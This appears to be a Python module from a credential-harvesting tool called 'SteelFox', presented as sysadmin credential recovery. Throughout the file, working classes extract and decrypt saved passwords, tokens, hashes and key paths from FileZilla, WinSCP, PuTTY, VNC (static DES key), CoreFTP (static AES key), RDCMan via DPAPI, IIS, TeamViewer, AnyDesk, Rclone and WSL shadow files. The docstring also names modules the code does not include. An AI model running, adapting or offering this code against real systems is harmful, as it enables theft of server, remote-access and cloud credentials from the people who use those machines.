# -*- coding: utf-8 -*-
"""
SteelFox — System Administration Tool Credential Recovery

Recovers credentials from:
  - FileZilla (Client & Server)
  - WinSCP
  - PuTTY / PuTTY CM
  - mRemoteNG
  - RDP saved connections
  - OpenSSH for Windows
  - Rclone
  - CoreFTP
"""

from __future__ import annotations

import base64
import json
import logging
import os
import re
import winreg
import xml.etree.ElementTree as ET
from pathlib import Path
from typing import Any

from steelfox.core.config import config
from steelfox.core.module_base import Category, ModuleBase, ModuleMeta

logger = logging.getLogger("steelfox")


def _resolve(template: str) -> str | None:
    try:
        result = template
        for k, v in config.profile.items():
            result = result.replace(f"{{{k}}}", v)
        return result
    except Exception:
        return None


# ═══════════════════════════════════════════════════════════════════════════
# FileZilla
# ═══════════════════════════════════════════════════════════════════════════

class FileZilla(ModuleBase):
    """Recover saved FTP/SFTP credentials from FileZilla."""

    meta = ModuleMeta(
        name="FileZilla",
        category=Category.SYSADMIN,
        description="Recover FTP/SFTP server credentials from FileZilla configuration",
    )

    def run(self) -> list[dict[str, Any]]:
        results: list[dict[str, Any]] = []

        fz_paths = [
            Path(_resolve("{APPDATA}\\FileZilla") or ""),
        ]

        for base in fz_paths:
            if not base.exists():
                continue

            # recentservers.xml and sitemanager.xml both store credentials
            for xml_file in ["recentservers.xml", "sitemanager.xml"]:
                filepath = base / xml_file
                if not filepath.exists():
                    continue

                try:
                    tree = ET.parse(str(filepath))
                    root = tree.getroot()

                    for server in root.iter("Server"):
                        host = server.findtext("Host", "")
                        port = server.findtext("Port", "21")
                        protocol = server.findtext("Protocol", "0")
                        user = server.findtext("User", "")
                        password_encoded = server.findtext("Pass", "")

                        password = ""
                        if password_encoded:
                            # FileZilla base64 encodes passwords
                            try:
                                password = base64.b64decode(password_encoded).decode(
                                    "utf-8", errors="replace"
                                )
                            except Exception:
                                password = password_encoded

                        proto_name = {
                            "0": "FTP", "1": "SFTP", "3": "FTPS", "4": "FTPES"
                        }.get(protocol, "FTP")

                        if host and (user or password):
                            results.append(self._make_credential(
                                source="FileZilla",
                                url=f"{proto_name}://{host}:{port}",
                                username=user,
                                password=password,
                            ))
                except Exception as e:
                    logger.debug("FileZilla XML parse failed: %s", e)

        return results


# ═══════════════════════════════════════════════════════════════════════════
# WinSCP
# ═══════════════════════════════════════════════════════════════════════════

class WinSCP(ModuleBase):
    """Recover saved SSH/SCP/SFTP credentials from WinSCP."""

    meta = ModuleMeta(
        name="WinSCP",
        category=Category.SYSADMIN,
        description="Recover SSH/SCP/SFTP credentials from WinSCP registry and ini file",
        registry_used=True,
    )

    def run(self) -> list[dict[str, Any]]:
        results: list[dict[str, Any]] = []

        # Method 1: Registry
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"SOFTWARE\Martin Prikryl\WinSCP 2\Sessions",
            )
            for i in range(winreg.QueryInfoKey(key)[0]):
                try:
                    session_name = winreg.EnumKey(key, i)
                    session_key = winreg.OpenKey(key, session_name)

                    hostname = self._reg_val(session_key, "HostName")
                    username = self._reg_val(session_key, "UserName")
                    password = self._reg_val(session_key, "Password")

                    if hostname:
                        decrypted_pwd = ""
                        if password:
                            decrypted_pwd = self._decrypt_winscp_password(
                                password, hostname, username
                            )

                        results.append(self._make_credential(
                            source="WinSCP",
                            url=hostname,
                            username=username,
                            password=decrypted_pwd or f"<encrypted: {password[:30]}...>" if password else "",
                        ))

                    winreg.CloseKey(session_key)
                except Exception:
                    continue
            winreg.CloseKey(key)
        except Exception:
            pass

        # Method 2: WinSCP.ini file
        ini_path = Path(_resolve("{APPDATA}\\WinSCP.ini") or "")
        if ini_path.exists():
            try:
                from configparser import ConfigParser
                cp = ConfigParser()
                cp.read(str(ini_path), encoding="utf-8")
                for section in cp.sections():
                    if section.startswith("Sessions\\"):
                        hostname = cp.get(section, "HostName", fallback="")
                        username = cp.get(section, "UserName", fallback="")
                        password = cp.get(section, "Password", fallback="")
                        if hostname:
                            results.append(self._make_credential(
                                source="WinSCP (ini)",
                                url=hostname,
                                username=username,
                                password=password,
                            ))
            except Exception:
                pass

        return results

    @staticmethod
    def _reg_val(key, name: str) -> str:
        try:
            value, _ = winreg.QueryValueEx(key, name)
            return str(value)
        except Exception:
            return ""

    @staticmethod
    def _decrypt_winscp_password(encrypted: str, hostname: str, username: str) -> str:
        """Attempt to decrypt WinSCP stored password."""
        # WinSCP uses a custom XOR-based encryption
        try:
            key_str = username + hostname

            def next_char():
                nonlocal encrypted
                if len(encrypted) < 2:
                    return 0
                val = int(encrypted[:2], 16)
                encrypted = encrypted[2:]
                return val

            flag = next_char()
            if flag == 255:
                next_char()  # skip
                length = next_char()
            else:
                length = flag

            next_char()
            next_char()

            result = []
            for _ in range(length):
                val = next_char()
                result.append(val)

            if flag == 255:
                # XOR with key
                key_bytes = [ord(c) for c in key_str]
                decrypted = []
                for i, val in enumerate(result):
                    decrypted.append(chr(val ^ key_bytes[i % len(key_bytes)] if key_bytes else val))
                return "".join(decrypted)
            else:
                return "".join(chr(c) for c in result)

        except Exception:
            return ""


# ═══════════════════════════════════════════════════════════════════════════
# PuTTY
# ═══════════════════════════════════════════════════════════════════════════

class PuTTY(ModuleBase):
    """Recover PuTTY saved sessions and SSH host keys."""

    meta = ModuleMeta(
        name="PuTTY",
        category=Category.SYSADMIN,
        description="Recover PuTTY saved sessions, proxy credentials, and SSH keys",
        registry_used=True,
    )

    def run(self) -> list[dict[str, Any]]:
        results: list[dict[str, Any]] = []

        # Saved sessions
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"SOFTWARE\SimonTatham\PuTTY\Sessions",
            )
            for i in range(winreg.QueryInfoKey(key)[0]):
                try:
                    session_name = winreg.EnumKey(key, i)
                    session_key = winreg.OpenKey(key, session_name)

                    hostname = self._rv(session_key, "HostName")
                    port = self._rv(session_key, "PortNumber")
                    username = self._rv(session_key, "UserName")
                    proxy_host = self._rv(session_key, "ProxyHost")
                    proxy_user = self._rv(session_key, "ProxyUsername")
                    proxy_pass = self._rv(session_key, "ProxyPassword")
                    private_key = self._rv(session_key, "PublicKeyFile")

                    if hostname:
                        entry: dict[str, Any] = self._make_credential(
                            source="PuTTY",
                            url=f"{hostname}:{port}" if port else hostname,
                            username=username,
                        )
                        if private_key:
                            entry["Private Key"] = private_key
                        if proxy_host:
                            entry["Proxy"] = f"{proxy_user}@{proxy_host}" if proxy_user else proxy_host
                        if proxy_pass:
                            entry["Proxy Password"] = proxy_pass
                        results.append(entry)

                    winreg.CloseKey(session_key)
                except Exception:
                    continue
            winreg.CloseKey(key)
        except Exception:
            pass

        # SSH host keys
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"SOFTWARE\SimonTatham\PuTTY\SshHostKeys",
            )
            for i in range(winreg.QueryInfoKey(key)[1]):
                try:
                    name, value, _ = winreg.EnumValue(key, i)
                    results.append({
                        "Source": "PuTTY (SSH Host Key)",
                        "Key": name,
                        "Fingerprint": str(value)[:80] + "...",
                    })
                except Exception:
                    continue
            winreg.CloseKey(key)
        except Exception:
            pass

        return results

    @staticmethod
    def _rv(key, name: str) -> str:
        try:
            value, _ = winreg.QueryValueEx(key, name)
            return str(value) if value else ""
        except Exception:
            return ""


# ═══════════════════════════════════════════════════════════════════════════
# mRemoteNG
# ═══════════════════════════════════════════════════════════════════════════

class MRemoteNG(ModuleBase):
    """Recover saved remote desktop/SSH connections from mRemoteNG."""

    meta = ModuleMeta(
        name="mRemoteNG",
        category=Category.SYSADMIN,
        description="Recover mRemoteNG saved connection credentials",
    )

    def run(self) -> list[dict[str, Any]]:
        results: list[dict[str, Any]] = []

        config_path = Path(_resolve("{APPDATA}\\mRemoteNG\\confCons.xml") or "")
        if not config_path.exists():
            return results

        try:
            tree = ET.parse(str(config_path))
            root = tree.getroot()

            for node in root.iter("Node"):
                hostname = node.get("Hostname", "")
                username = node.get("Username", "")
                password = node.get("Password", "")
                protocol = node.get("Protocol", "")
                port = node.get("Port", "")
                domain = node.get("Domain", "")
                name = node.get("Name", "")

                if hostname:
                    entry = self._make_credential(
                        source="mRemoteNG",
                        url=f"{protocol}://{hostname}:{port}" if port else hostname,
                        username=f"{domain}\\{username}" if domain else username,
                        password=password,  # Encrypted with AES by default
                        extra={
                            "Connection Name": name,
                            "Protocol": protocol,
                        },
                    )
                    results.append(entry)

        except Exception as e:
            logger.debug("mRemoteNG config parse failed: %s", e)

        return results


# ═══════════════════════════════════════════════════════════════════════════
# Rclone
# ═══════════════════════════════════════════════════════════════════════════

class Rclone(ModuleBase):
    """Recover cloud storage credentials from Rclone configuration."""

    meta = ModuleMeta(
        name="Rclone",
        category=Category.SYSADMIN,
        description="Recover Rclone remote storage credentials",
    )

    def run(self) -> list[dict[str, Any]]:
        results: list[dict[str, Any]] = []

        rclone_config = Path(_resolve("{APPDATA}\\rclone\\rclone.conf") or "")
        if not rclone_config.exists():
            # Also check home directory
            rclone_config = Path(_resolve("{USERPROFILE}\\.config\\rclone\\rclone.conf") or "")

        if not rclone_config.exists():
            return results

        try:
            from configparser import ConfigParser
            cp = ConfigParser()
            cp.read(str(rclone_config), encoding="utf-8")

            for section in cp.sections():
                remote_type = cp.get(section, "type", fallback="")
                entry: dict[str, Any] = {
                    "Source": "Rclone",
                    "Remote Name": section,
                    "Type": remote_type,
                }

                # Extract credentials based on type
                for key in cp.options(section):
                    value = cp.get(section, key)
                    if any(kw in key for kw in ["pass", "token", "key", "secret", "user", "client_id"]):
                        entry[key] = value

                results.append(entry)

        except Exception as e:
            logger.debug("Rclone config parse failed: %s", e)

        return results


# ═══════════════════════════════════════════════════════════════════════════
# VNC (RealVNC, TightVNC, TigerVNC, UltraVNC)
# ═══════════════════════════════════════════════════════════════════════════

class VNC(ModuleBase):
    """Recover VNC stored passwords (RealVNC, TightVNC, TigerVNC, UltraVNC)."""

    meta = ModuleMeta(
        name="VNC",
        category=Category.SYSADMIN,
        description="Recover VNC server/viewer stored passwords via registry and config files",
        registry_used=True,
    )

    # VNC uses a fixed DES key for password "encryption"
    _VNC_DES_KEY = bytes([23, 82, 107, 6, 35, 78, 88, 7])

    VNC_REG_PATHS = [
        # RealVNC
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\RealVNC\vncserver", "Password"),
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\RealVNC\WinVNC4", "Password"),
        (winreg.HKEY_CURRENT_USER, r"SOFTWARE\RealVNC\vncserver", "Password"),
        # TightVNC
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\TightVNC\Server", "Password"),
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\TightVNC\Server", "PasswordViewOnly"),
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\TightVNC\Server", "ControlPassword"),
        (winreg.HKEY_CURRENT_USER, r"SOFTWARE\TightVNC\Server", "Password"),
        # TigerVNC
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\TigerVNC\Server", "Password"),
        (winreg.HKEY_CURRENT_USER, r"SOFTWARE\TigerVNC\Server", "Password"),
        # UltraVNC
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Uvnc\ultravnc", "passwd"),
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Uvnc\ultravnc", "passwd2"),
    ]

    def run(self) -> list[dict[str, Any]]:
        results: list[dict[str, Any]] = []

        # --- Registry passwords ---
        for hive, key_path, val_name in self.VNC_REG_PATHS:
            try:
                key = winreg.OpenKey(hive, key_path)
                value, _ = winreg.QueryValueEx(key, val_name)
                winreg.CloseKey(key)

                if isinstance(value, bytes) and len(value) >= 8:
                    password = self._decrypt_vnc(value)
                    if password:
                        results.append({
                            "Source": f"VNC ({key_path.split(chr(92))[1]})",
                            "Type": val_name,
                            "Password": password,
                            "Registry": f"{key_path}\\{val_name}",
                        })
                elif isinstance(value, str) and value:
                    try:
                        enc = bytes.fromhex(value)
                        password = self._decrypt_vnc(enc)
                        if password:
                            results.append({
                                "Source": f"VNC ({key_path.split(chr(92))[1]})",
                                "Type": val_name,
                                "Password": password,
                            })
                    except ValueError:
                        pass
            except Exception:
                continue

        # --- UltraVNC ini file ---
        for ini_path in [
            "C:\\Program Files\\UltraVNC\\ultravnc.ini",
            "C:\\Program Files (x86)\\UltraVNC\\ultravnc.ini",
        ]:
            p = Path(ini_path)
            if p.exists():
                try:
                    content = p.read_text(encoding="utf-8", errors="replace")
                    for line in content.splitlines():
                        if "=" in line:
                            key_name, val = line.split("=", 1)
                            key_name = key_name.strip()
                            val = val.strip()
                            if key_name.lower() in ("passwd", "passwd2") and val:
                                try:
                                    enc = bytes.fromhex(val)
                                    password = self._decrypt_vnc(enc)
                                    if password:
                                        results.append({
                                            "Source": "UltraVNC (INI)",
                                            "Type": key_name,
                                            "Password": password,
                                            "Path": str(p),
                                        })
                                except ValueError:
                                    pass
                except Exception:
                    pass

        return results

    @classmethod
    def _decrypt_vnc(cls, encrypted: bytes) -> str:
        """Decrypt VNC password using static DES key."""
        try:
            from Crypto.Cipher import DES

            # VNC reverses bits in the key
            key = bytes([
                sum(((b >> i) & 1) << (7 - i) for i in range(8))
                for b in cls._VNC_DES_KEY
            ])
            cipher = DES.new(key, DES.MODE_ECB)
            decrypted = cipher.decrypt(encrypted[:8])
            return decrypted.rstrip(b"\x00").decode("utf-8", errors="replace")
        except Exception:
            return ""


# ═══════════════════════════════════════════════════════════════════════════
# Cyberduck
# ═══════════════════════════════════════════════════════════════════════════

class Cyberduck(ModuleBase):
    """Recover Cyberduck stored FTP/SFTP/S3/WebDAV credentials."""

    meta = ModuleMeta(
        name="Cyberduck",
        category=Category.SYSADMIN,
        description="Recover Cyberduck stored connections (passwords via DPAPI)",
        dpapi_used=True,
    )

    def run(self) -> list[dict[str, Any]]:
        results: list[dict[str, Any]] = []

        cd_path = Path(_resolve("{APPDATA}\\Cyberduck") or "")
        if not cd_path.exists():
            return results

        # user.config — settings with DPAPI-encrypted passwords
        for bookmark in cd_path.rglob("*.duck"):
            try:
                tree = ET.parse(str(bookmark))
                root = tree.getroot()

                entry: dict[str, Any] = {"Source": "Cyberduck"}

                for elem in root:
                    tag = elem.tag
                    text = elem.text or ""
                    if tag == "Protocol":
                        entry["Protocol"] = text
                    elif tag == "Hostname":
                        entry["Host"] = text
                    elif tag == "Port":
                        entry["Port"] = text
                    elif tag == "Username":
                        entry["Username"] = text
                    elif tag == "Path":
                        entry["Remote Path"] = text

                results.append(entry)
            except Exception:
                continue

        # Bookmarks in %APPDATA%\Cyberduck\Bookmarks\
        bookmarks_dir = cd_path / "Bookmarks"
        if bookmarks_dir.exists():
            for bm in bookmarks_dir.glob("*.duck"):
                try:
                    tree = ET.parse(str(bm))
                    root = tree.getroot()
                    entry = {"Source": "Cyberduck (Bookmark)"}
                    for elem in root:
                        if elem.tag in ("Protocol", "Hostname", "Port", "Username"):
                            entry[elem.tag] = elem.text or ""
                    if len(entry) > 1:
                        results.append(entry)
                except Exception:
                    continue

        # Passwords stored in Windows Credential Manager under Cyberduck-*
        try:
            from steelfox.core.winapi import enumerate_credential_manager

            creds = enumerate_credential_manager()
            for cred in creds:
                target = cred.get("Target", "")
                if "cyberduck" in target.lower():
                    results.append({
                        "Source": "Cyberduck (Credential Manager)",
                        "Target": target,
                        "Username": cred.get("Username", ""),
                        "Password": cred.get("Password", ""),
                    })
        except Exception:
            pass

        return results


# ═══════════════════════════════════════════════════════════════════════════
# RDP Connection Manager
# ═══════════════════════════════════════════════════════════════════════════

class RDPManager(ModuleBase):
    """Recover Remote Desktop Connection Manager saved credentials."""

    meta = ModuleMeta(
        name="RDP Connection Manager",
        category=Category.SYSADMIN,
        description="Recover RDCMan saved connections with DPAPI-encrypted passwords",
        dpapi_used=True,
    )

    def run(self) -> list[dict[str, Any]]:
        results: list[dict[str, Any]] = []

        # RDCMan settings file
        rdg_path = Path(_resolve("{LOCALAPPDATA}\\Microsoft\\Remote Desktop Connection Manager") or "")
        if not rdg_path.exists():
            rdg_path = Path(_resolve("{APPDATA}") or "")

        # Search for .rdg files (the actual connection group files)
        search_paths = [
            rdg_path,
            Path(_resolve("{USERPROFILE}\\Documents") or ""),
            Path(_resolve("{USERPROFILE}\\Desktop") or ""),
        ]

        for search_dir in search_paths:
            if not search_dir.exists():
                continue

            for rdg_file in search_dir.rglob("*.rdg"):
                try:
                    tree = ET.parse(str(rdg_file))
                    root = tree.getroot()

                    for server in root.iter("server"):
                        entry: dict[str, Any] = {
                            "Source": "RDCMan",
                            "File": str(rdg_file),
                        }

                        name = server.find("properties/name")
                        if name is not None and name.text:
                            entry["Server"] = name.text

                        display = server.find("properties/displayName")
                        if display is not None and display.text:
                            entry["Display Name"] = display.text

                        # Logon credentials
                        username = server.find(".//userName")
                        if username is not None and username.text:
                            entry["Username"] = username.text

                        domain = server.find(".//domain")
                        if domain is not None and domain.text:
                            entry["Domain"] = domain.text

                        # Password is base64-encoded DPAPI blob
                        password = server.find(".//password")
                        if password is not None and password.text:
                            try:
                                from steelfox.core.winapi import win32_crypt_unprotect_data

                                enc = base64.b64decode(password.text)
                                dec = win32_crypt_unprotect_data(enc)
                                if dec:
                                    entry["Password"] = dec.decode("utf-16-le", errors="replace").rstrip("\x00")
                                else:
                                    entry["Password (DPAPI)"] = f"[{len(enc)} bytes]"
                            except Exception:
                                entry["Password (DPAPI)"] = password.text[:40] + "..."

                        results.append(entry)
                except Exception:
                    continue

        return results


# ═══════════════════════════════════════════════════════════════════════════
# CoreFTP
# ═══════════════════════════════════════════════════════════════════════════

class CoreFTP(ModuleBase):
    """Recover CoreFTP saved FTP credentials."""

    meta = ModuleMeta(
        name="CoreFTP",
        category=Category.SYSADMIN,
        description="Recover CoreFTP stored server credentials (AES-ECB decryption)",
        registry_used=True,
    )

    _COREFTP_KEY = b"hdfzpysvpzimorhk"  # static AES key

    def run(self) -> list[dict[str, Any]]:
        results: list[dict[str, Any]] = []

        try:
            sites_key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"SOFTWARE\FTPware\CoreFTP\Sites",
            )

            idx = 0
            while True:
                try:
                    site_name = winreg.EnumKey(sites_key, idx)
                    site_key = winreg.OpenKey(sites_key, site_name)

                    entry: dict[str, Any] = {
                        "Source": "CoreFTP",
                        "Site": site_name,
                    }

                    for val_name in ["Host", "Port", "User", "PW"]:
                        try:
                            val, _ = winreg.QueryValueEx(site_key, val_name)
                            if val_name == "PW" and val:
                                entry["Password"] = self._decrypt_coreftp(str(val))
                            else:
                                entry[val_name] = str(val)
                        except FileNotFoundError:
                            continue

                    winreg.CloseKey(site_key)
                    results.append(entry)
                    idx += 1
                except OSError:
                    break

            winreg.CloseKey(sites_key)
        except Exception:
            pass

        return results

    @classmethod
    def _decrypt_coreftp(cls, hex_password: str) -> str:
        """Decrypt CoreFTP password (AES-ECB with static key)."""
        try:
            from Crypto.Cipher import AES

            enc = bytes.fromhex(hex_password)
            cipher = AES.new(cls._COREFTP_KEY, AES.MODE_ECB)
            dec = cipher.decrypt(enc)
            # Remove PKCS padding
            pad = dec[-1]
            if 0 < pad <= 16:
                dec = dec[:-pad]
            return dec.decode("utf-8", errors="replace")
        except Exception:
            return hex_password


# ═══════════════════════════════════════════════════════════════════════════
# IIS Application Pool & Central Certificate Provider
# ═══════════════════════════════════════════════════════════════════════════

class IISAppPool(ModuleBase):
    """Recover IIS Application Pool identities."""

    meta = ModuleMeta(
        name="IIS Application Pool",
        category=Category.SYSADMIN,
        description="Recover IIS Application Pool credentials via appcmd.exe",
        admin_required=True,
        system_module=True,
    )

    def run(self) -> list[dict[str, Any]]:
        results: list[dict[str, Any]] = []

        appcmd = Path(r"C:\Windows\System32\inetsrv\appcmd.exe")
        if not appcmd.exists():
            return results

        try:
            import subprocess

            output = subprocess.run(
                [str(appcmd), "list", "apppool", "/text:*"],
                capture_output=True, text=True, timeout=15,
                creationflags=0x08000000,  # CREATE_NO_WINDOW
            ).stdout

            current_pool: dict[str, Any] = {}
            for line in output.splitlines():
                line = line.strip()
                if line.startswith("APPPOOL"):
                    if current_pool and current_pool.get("Username"):
                        results.append(current_pool)
                    name = line.split('"')[1] if '"' in line else line
                    current_pool = {"Source": "IIS AppPool", "Pool Name": name}
                elif ":" in line:
                    key, val = line.split(":", 1)
                    key = key.strip()
                    val = val.strip()
                    if key == "processModel.userName" and val:
                        current_pool["Username"] = val
                    elif key == "processModel.password" and val:
                        current_pool["Password"] = val

            if current_pool and current_pool.get("Username"):
                results.append(current_pool)

        except Exception:
            pass

        return results


class IISCentralCert(ModuleBase):
    """Recover IIS Central Certificate Provider credentials."""

    meta = ModuleMeta(
        name="IIS Central Certificate Store",
        category=Category.SYSADMIN,
        description="Recover IIS Central Certificate Store private key password",
        admin_required=True,
        system_module=True,
        registry_used=True,
    )

    def run(self) -> list[dict[str, Any]]:
        results: list[dict[str, Any]] = []

        try:
            key = winreg.OpenKey(
                winreg.HKEY_LOCAL_MACHINE,
                r"SOFTWARE\Microsoft\IIS\CentralCertProvider",
            )
            entry: dict[str, Any] = {"Source": "IIS Central Cert Store"}

            for val_name in ["CertStoreLocation", "UserName", "Password", "PrivateKeyPassword"]:
                try:
                    val, _ = winreg.QueryValueEx(key, val_name)
                    entry[val_name] = str(val) if not isinstance(val, bytes) else f"[{len(val)} bytes encrypted]"
                except FileNotFoundError:
                    continue

            winreg.CloseKey(key)
            if len(entry) > 1:
                results.append(entry)
        except Exception:
            pass

        return results


# ═══════════════════════════════════════════════════════════════════════════
# WSL (Windows Subsystem for Linux)
# ═══════════════════════════════════════════════════════════════════════════

class WSL(ModuleBase):
    """Recover WSL distribution shadow hashes and configuration."""

    meta = ModuleMeta(
        name="WSL",
        category=Category.SYSADMIN,
        description="Extract user password hashes from WSL distributions (/etc/shadow)",
    )

    def run(self) -> list[dict[str, Any]]:
        results: list[dict[str, Any]] = []

        # WSL2 distributions in Packages
        packages_dir = Path(_resolve("{LOCALAPPDATA}\\Packages") or "")
        if not packages_dir.exists():
            return results

        wsl_patterns = [
            "CanonicalGroupLimited.Ubuntu*",
            "TheDebianProject.DebianGNULinux*",
            "*SUSE*",
            "*kali*",
            "*Fedora*",
            "*Alpine*",
        ]

        # Also check legacy WSL1 location
        legacy_lxss = Path(_resolve("{LOCALAPPDATA}\\lxss") or "")

        distro_roots: list[tuple[str, Path]] = []

        for pattern in wsl_patterns:
            for d in packages_dir.glob(pattern):
                rootfs = d / "LocalState" / "rootfs"
                if rootfs.exists():
                    distro_roots.append((d.name, rootfs))

        if legacy_lxss.exists():
            rootfs = legacy_lxss / "rootfs"
            if rootfs.exists():
                distro_roots.append(("Legacy WSL", rootfs))

        for distro_name, rootfs in distro_roots:
            shadow_file = rootfs / "etc" / "shadow"
            if not shadow_file.exists():
                continue

            try:
                content = shadow_file.read_text(encoding="utf-8", errors="replace")
                for line in content.splitlines():
                    if not line.strip() or line.startswith("#"):
                        continue
                    parts = line.split(":")
                    if len(parts) >= 2:
                        username = parts[0]
                        password_hash = parts[1]
                        # Skip locked/empty accounts
                        if password_hash in ("*", "!", "!!", "", "x"):
                            continue
                        results.append({
                            "Source": f"WSL ({distro_name})",
                            "Username": username,
                            "Hash": password_hash,
                        })
            except PermissionError:
                results.append({
                    "Source": f"WSL ({distro_name})",
                    "Note": "shadow file exists but access denied (need admin)",
                    "Path": str(shadow_file),
                })
            except Exception:
                continue

            # Also check for SSH keys in the distribution
            ssh_dir = rootfs / "home"
            if ssh_dir.exists():
                for user_dir in ssh_dir.iterdir():
                    ssh_path = user_dir / ".ssh"
                    if ssh_path.exists():
                        for key_file in ssh_path.iterdir():
                            if key_file.is_file() and key_file.name in (
                                "id_rsa", "id_ed25519", "id_ecdsa", "id_dsa",
                            ):
                                results.append({
                                    "Source": f"WSL ({distro_name})",
                                    "Type": "SSH Private Key",
                                    "User": user_dir.name,
                                    "Key File": str(key_file),
                                })

        return results


# ═══════════════════════════════════════════════════════════════════════════
# AnyDesk / TeamViewer / RustDesk
# ═══════════════════════════════════════════════════════════════════════════

class AnyDesk(ModuleBase):
    """Recover AnyDesk configuration and access data."""

    meta = ModuleMeta(
        name="AnyDesk",
        category=Category.SYSADMIN,
        description="Recover AnyDesk ID, alias, and password hash",
    )

    def run(self) -> list[dict[str, Any]]:
        results: list[dict[str, Any]] = []

        ad_paths = [
            Path(_resolve("{APPDATA}\\AnyDesk") or ""),
            Path(_resolve("{PROGRAMDATA}\\AnyDesk") or ""),
        ]

        for ad_path in ad_paths:
            if not ad_path.exists():
                continue

            # system.conf
            sys_conf = ad_path / "system.conf"
            if sys_conf.exists():
                try:
                    content = sys_conf.read_text(encoding="utf-8", errors="replace")
                    entry: dict[str, Any] = {"Source": "AnyDesk"}

                    for line in content.splitlines():
                        if "=" in line:
                            k, v = line.split("=", 1)
                            k = k.strip()
                            v = v.strip()
                            if k == "ad.anynet.id":
                                entry["AnyDesk ID"] = v
                            elif k == "ad.anynet.alias":
                                entry["Alias"] = v
                            elif k == "ad.anynet.pwd_hash":
                                entry["Password Hash"] = v
                            elif k == "ad.anynet.pwd_salt":
                                entry["Password Salt"] = v

                    if len(entry) > 1:
                        results.append(entry)
                except Exception:
                    pass

            # ad.trace — may contain connection logs
            for trace in ad_path.glob("ad*.trace"):
                results.append({
                    "Source": "AnyDesk (Log)",
                    "Path": str(trace),
                    "Size": f"{trace.stat().st_size:,} bytes",
                })

        return results


class TeamViewer(ModuleBase):
    """Recover TeamViewer configuration and stored access data."""

    meta = ModuleMeta(
        name="TeamViewer",
        category=Category.SYSADMIN,
        description="Recover TeamViewer ID, settings, and stored password data",
        registry_used=True,
    )

    def run(self) -> list[dict[str, Any]]:
        results: list[dict[str, Any]] = []

        # Registry
        for version in ["", "5", "6", "7", "8", "9", "10", "11", "12", "13", "14", "15"]:
            key_path = rf"SOFTWARE\TeamViewer{version}"
            try:
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path)
                entry: dict[str, Any] = {"Source": f"TeamViewer{version or ''}"}

                for val_name in [
                    "ClientID", "Version", "OwningManagerAccountName",
                    "SecurityPasswordAES", "ServerPasswordAES",
                    "ProxyPasswordAES", "LicenseKeyAES",
                    "PermanentPassword", "SecurityPasswordExported",
                ]:
                    try:
                        val, _ = winreg.QueryValueEx(key, val_name)
                        if isinstance(val, bytes):
                            entry[val_name] = val.hex()
                        else:
                            entry[val_name] = str(val)
                    except FileNotFoundError:
                        continue

                winreg.CloseKey(key)
                if len(entry) > 1:
                    results.append(entry)
            except Exception:
                continue

        # Also check HKCU
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"SOFTWARE\TeamViewer")
            entry = {"Source": "TeamViewer (User)"}
            for val_name in ["ClientID", "SecurityPasswordAES", "PermanentPassword"]:
                try:
                    val, _ = winreg.QueryValueEx(key, val_name)
                    entry[val_name] = val.hex() if isinstance(val, bytes) else str(val)
                except FileNotFoundError:
                    continue
            winreg.CloseKey(key)
            if len(entry) > 1:
                results.append(entry)
        except Exception:
            pass

        return results
